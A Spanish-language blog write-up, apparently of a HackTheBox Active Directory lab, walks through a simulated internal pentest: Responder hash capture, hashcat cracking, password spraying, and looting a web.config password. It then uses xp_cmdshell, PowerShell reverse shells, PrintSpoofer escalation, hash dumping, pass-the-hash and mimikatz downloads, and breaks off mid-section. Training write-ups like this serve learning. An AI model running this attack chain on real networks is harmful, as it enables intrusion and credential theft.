@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Laboratorio De Enumeración Y Ataques De AD - Parte 2 | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-enumeraci%C3%B3n-y-ataques-de-ad---parte-2/" />
+<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    En curso
+    "
+/>
+<meta property="og:description" content="
+    En curso
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de Enumeración y ataques de AD - Parte 2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-enumeraci%C3%B3n-y-ataques-de-ad---parte-2/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-07-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-07-30T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de Enumeración y ataques de AD - Parte 2">
+  <meta name="twitter:description" content="En curso">
+
+
+  <meta itemprop="name" content="Laboratorio de Enumeración y ataques de AD - Parte 2">
+  <meta itemprop="description" content="En curso">
+  <meta itemprop="datePublished" content="2025-07-30T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-07-30T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1233">
+  <meta itemprop="keywords" content="Hackthebox,AD">
+
+
+
+
+<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">
+
+
+
+
+
+<script src="https://chlorenzo.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4G9W14SLG4');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de Enumeración y ataques de AD - Parte 2</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Jul 30, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    7 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="https://chlorenzo.com/tags/hackthebox"><span
+                                    class="tag bg-dark">hackthebox</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/ad"><span
+                                    class="tag bg-dark">AD</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <h4 id="enunciado">Enunciado</h4>
+<p>Nuestro cliente, Inlanefreight, nos ha contratado de nuevo para realizar una prueba de penetración interna completa. El cliente busca encontrar y corregir el mayor número posible de fallos antes de iniciar un proceso de fusión y adquisición. El nuevo CISO está especialmente preocupado por los fallos de seguridad de AD más sutiles que podrían haber pasado desapercibidos en pruebas de penetración anteriores. El cliente no se preocupa por tácticas sigilosas o evasivas y, además, nos ha proporcionado una máquina virtual Parrot Linux dentro de la red interna para obtener la mejor cobertura posible de todos los ángulos de la red y del entorno de Active Directory.
+Conéctese al host de ataque interno mediante SSH (también puede conectarse <code>xfreerdp</code>como se muestra al principio de este módulo) y comience a buscar una posición de entrada en el dominio. Una vez establecida, enumere el dominio y busque fallos que puedan utilizarse para actuar lateralmente, escalar privilegios y comprometer el dominio.</p>
+<h4 id="reconocimiento"><strong>Reconocimiento</strong></h4>
+<p>Nos conectamos por ssh a la máquina que nos proporciona <code>Inlanefreight</code> y a partir ahí empezamos el reconocimiento.
+Vemos las interfaces de red.
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/reconocimiento_2.png" alt=""></p>
+<p>Hacemos ping para ver la ip del <code>Domain Controller</code>.</p>
+<p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/reconocimiento_1.png" alt="">
+Tenemos como dominio <code>inlanefreight.local</code>
+Como DC <code>172.16.7.3</code></p>
+<p><strong>Obtenga el hash de la contraseña de una cuenta de usuario del dominio que pueda utilizarse para restablecerse en el dominio. ¿Cuál es el nombre de la cuenta?</strong>
+Ejecutamos el Responder:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I ens224
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_1-1.png" alt="">
+Y vemos que nos pone que capturó un hash del usuario <code>AB920</code>
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_1-2.png" alt="">
+Leemos el log del responder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt 
+</span></span></code></pre></div><p><strong>¿Cuál es la contraseña de texto simple de este usuario?</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt 
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_2-1.png" alt=""></p>
+<p>Copiamos un hash y nos lo traemos a local para decifrarlo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> hash1.txt /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_2-2.png" alt=""></p>
+<p><strong>Envíe el contenido del archivo C:\flag.txt en MS01.</strong></p>
+<p>Tenemos el usuario y contraseña <code>AB920</code>:<code>weasal</code>
+Realizamos un escaneo de la red para detectar el MS01.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>namp -sn 172.16.7.240/23
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_3-1.png" alt="">
+Dentro de esta subred tenemos las IPs <code>172.16.7.50</code>, <code>172.16.7.60</code>, <code>172.16.7.240</code>.</p>
+<p>Hacemos otro escaneo más detallado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -sV -O -Pn 172.16.7.50 172.16.7.60 172.16.7.240
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_3-2.png" alt="">
+Comprobamos el nombre de la máquina con <code>ntbscan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntbscan &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_3-3.png" alt=""></p>
+<p>Con las credenciales que tenemos intentamos acceder al <code>MS01</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 172.16.7.50 -u AB920 -p weasal
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_3-4.png" alt="">
+Ahora solo nos movemos al directorio de la flag. <code>C:\flag.txt</code></p>
+<p><strong>Utilice un método común para obtener credenciales débiles de otro usuario. Envíe el nombre de usuario del usuario cuyas credenciales obtenga.</strong>
+Vamos a enumerar los usuarios desde el <code>DC</code> y exportarlos a un archivo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo crackmapexec smb 172.16.7.3 -u <span style="color:#e6db74">&#39;ab920&#39;</span> -p <span style="color:#e6db74">&#39;weasal&#39;</span> --users | tee  usernames.txt
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_4-1.png" alt="">
+Nos quedamos solo con los usuarios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat usernames.txt | awk <span style="color:#e6db74">&#39;{print $5}&#39;</span> | grep <span style="color:#e6db74">&#39;INLANEFREIGHT.LOCAL&#39;</span> | awk -F<span style="color:#e6db74">&#39;\\\\&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>
+</span></span></code></pre></div><p>Hacemos rociado de contraseñas con <code>Welcome1</code> con la lista de usuarios que tenemos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt Welcome1
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_4-2.png" alt="">
+Y vemos que para el usuario <code>BR086</code> es válida dicha contraseña.</p>
+<p><strong>Localice un archivo de configuración que contenga una cadena de conexión MSSQL. ¿Cuál es la contraseña del usuario que aparece en este archivo?</strong>
+Tenemos usuario <code>BR086</code>:<code>Welcome1</code>
+Estamos buscando un archivo de configuración.
+Intentamos mostrar los archivos compartidos desde el <code>DC</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L <span style="color:#ae81ff">\\\\</span>172.16.7.3 -U br086
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_6-1.png" alt="">
+Y vemos una carpeta que nos llama la atención.
+Entramos con dicho usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient <span style="color:#e6db74">&#39;//172.16.7.3/Department Shares&#39;</span> -N U br086
+</span></span></code></pre></div><p>Y vemos una serie de recursos compartidos. Empezamos a buscar.
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_6-2.png" alt="">
+Tenemos esto:
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_6-3.png" alt="">
+Nos lo descargamos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>get web.config
+</span></span></code></pre></div><p>Y lo revisamos en la máquina pivote.
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_6-4.png" alt="">
+Y vemos un usuario <code>netdb</code>:<code>D@ta_bAse_adm1n!</code></p>
+<p><strong>Envíe el contenido del archivo flag.txt en el Escritorio del administrador en el host SQL01.</strong>
+Debemos recordar que anteriormente cuando escaneamos la red descubrimos que el host <code>MS01</code> era <code>172.16.7.50</code> y que el host <code>SQL01</code> era el <code>172.16.7.60</code>. Vamos a trabajar con este último.
+Nos conectamos al host por mssql dado que es un servidor con una base de datos de microsoft.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mssqlclient.py -dc-ip 172.16.7.3 INLANEFREIGHT/netdb:<span style="color:#e6db74">&#39;D@ta_bAse_adm1n!&#39;</span>@172.16.7.60
+</span></span></code></pre></div><p>Habilitamos el <code>xp_cmdshell</code> para poder ejecutar comando en el servidor a través de SQL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>enable_xp_cmdshell;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-1.png" alt="">
+Vemos que tenemos acceso sin embargo no tenemos permisos para leer la flag que se encuentra en el path de <code>Administrator</code>.</p>
+<p>Cuando revisamos la información de los permisos del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">exec</span> xp_cmdshell <span style="color:#e6db74">&#39;whoami/priv&#39;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-2.png" alt="">
+Al tener permisos de Impersonate habilitados podemos explotar la vulnerabilidad de <code>PrintSpoofer</code>, donde nos permite pasar a root del sistema.
+<a href="https://github.com/k4sth4/PrintSpoofer">Repositorio de PrintSpoofer</a>
+Por un lado tenemos la sesión mssql en SQL01 donde ejecutamos comandos en el servidor y por otro lado tenemos nuestra máquina pivote.</p>
+<p>Lo que vamos a hacer es lanzarnos una reverse shell desde la sesión <code>SQL01</code> a nuestra máquina pivote donde podamos ejecutar comandos más comodos.
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-3.png" alt="">
+Nos ponemos en escucha en nuestra máquina pivote:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">1111</span>
+</span></span></code></pre></div><p>Lanzamos la reverse shell y tenemos ejecucion de comandos en SQL01.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>xp_cmdshell <span style="color:#e6db74">&#34;powershell -e JAK...CkA&#34;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-4.png" alt="">
+Luego nos copiamos el ejecutable de PrintSpoofer de la pivote para <code>SQL01</code>, Abrimos una 3ra sesión y conectandonos por ssh al pivote.
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-5.png" alt="">
+Nos lo descargamos a local, luego desde local, lo copiamos al pivote</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp -r PrintSpoofer.exe htb-student@&lt;IP&gt;:~/Downloads
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password</span>
+</span></span></code></pre></div><p>Y desde el pivote lo copiamos a SQL01, hacemos un simple servidor web.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m http.server
+</span></span></code></pre></div><p>Desde <code>SQL01</code> nos lo descargamos, debemos situarnos en un directorio que tengamos permisos de escritura, <code>C\Users\Public</code> por ejemplo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/PrintSpoofer.exe -OutFile .\PrintSpoofer.exe 
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-6.png" alt=""></p>
+<p>Posteriormente ejecutamos el archivo y preparamos una reverseshell hacia nuestro pivote donde la vamos a recibir con privilegios de <code>SYSTEM</code>. Esta vez por otro puerto.</p>
+<p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-7.png" alt="">
+Luego nos ponemos en escucha desde el pivote</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">3434</span>
+</span></span></code></pre></div><p>Y ejecutamos el PrintSpoofer.exe desde <code>SQL01</code> tal que así</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\PrintSpoofer.exe -i -c <span style="color:#e6db74">&#34;powershell JAB...Br&#34;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-8.png" alt="">
+Ya solo nos movemos a la ruta desedada <code>C:\Users\Administrator\Desktop\flag.txt</code>
+<img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_7-9.png" alt=""></p>
+<p><strong>Envíe el contenido del archivo flag.txt en el Escritorio del administrador en el host MS01.</strong>
+Para el host <code>MS01</code> tenemos:
+IP 172.16.7.50
+Usuario y contraseña <code>AB920</code>:<code>weasal</code></p>
+<p>LaZagne.exe</p>
+<p>Obtenemos:</p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 172.16.7.60 -u Administrator -H 136b3ddfbb62cb02e53a8f661248f364
+</span></span></code></pre></div><p>Obtenemos la flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/PowerView.ps1 -OutFile .\PowerView.ps1 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/Inveigh.ps1 -OutFile .\Inveigh.ps1 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/LaZagne.exe -OutFile .\LaZagne.exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/mimikatz.exe -OutFile .\mimikatz.exe
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Get-DomainUser -Identity Administrator | Get-DomainSPNTicket -Format Hashcat
+</span></span></code></pre></div><p><code>136b3ddfbb62cb02e53a8f661248f364</code></p>
+<p><strong>Obtenga las credenciales de un usuario con permisos genéricos en el grupo Administradores del dominio. ¿Cuál es el nombre de la cuenta de este usuario?</strong>
+<a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">PowerView Cheatsheet</a></p>
+<p>Accedemos por ssh a nuestra máquina pivote, le aplicamos un redirecionamiento de puertos mediante proxychains.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh htb-student@&lt;IP&gt; -D <span style="color:#ae81ff">9050</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Password </span>
+</span></span></code></pre></div><p>Vamos a copiar desde nuestra máquina atacante la herramienta PowerView.ps1 hacia nuestro pivote.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp -r  PowerView.ps1 htb-student@&lt;IP&gt;:~/Downloads
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-1.png" alt="">
+Mediante nuestra sesión de ssh vamos al directorio Downloads y servimos un servidor web para compartir la herramienta con <code>172.16.7.50</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -m http.server <span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div><p>Luego desde nuestra máquina atacante nos vamos a conectar a <code>172.16.7.50</code> con el las credenciales que obtuvimos al principio.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains xfreerdp3 /v:172.16.7.50 /u:br086 /p:<span style="color:#e6db74">&#39;Welcome1&#39;</span> /dynamic-resolution
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-2.png" alt="">
+Nos descargamos la herramienta desde <code>powershell</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">172.16</span>.7.<span style="color:#ae81ff">240</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>/PowerView.ps1 -OutFile .\PowerView.ps1 
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-3.png" alt="">
+Importamos la herramienta:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>import-module .\PowerView.ps1
+</span></span></code></pre></div><p>Y buscamos por el grupo <code>Domain Admins</code> que es por el que nos están preguntando:</p>
+<pre tabindex="0"><code class="language-powerview" data-lang="powerview">Get-DomainGPO -Identity &#34;Domain Admins&#34; 
+ConvertTo-Sid &#34;Domain Admins&#34;
+</code></pre><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-4.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainObjectAcl -Identity <span style="color:#e6db74">&#34;S-1-5-21-3327542485-274640656-2609762496-512&#34;</span> -ResolveGUIDs |? {$_.ActiveDirectoryRights <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;GenericAll&#34;</span>}
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/AD_enumeracion_labs_2/flag_9-5.png" alt=""></p>
+<p><code>S-1-5-21-3327542485-274640656-2609762496-4611</code></p>
+<p>Ahora que tenemos el Identificador de usuario lo convertimos llevamos a nombre normal.</p>
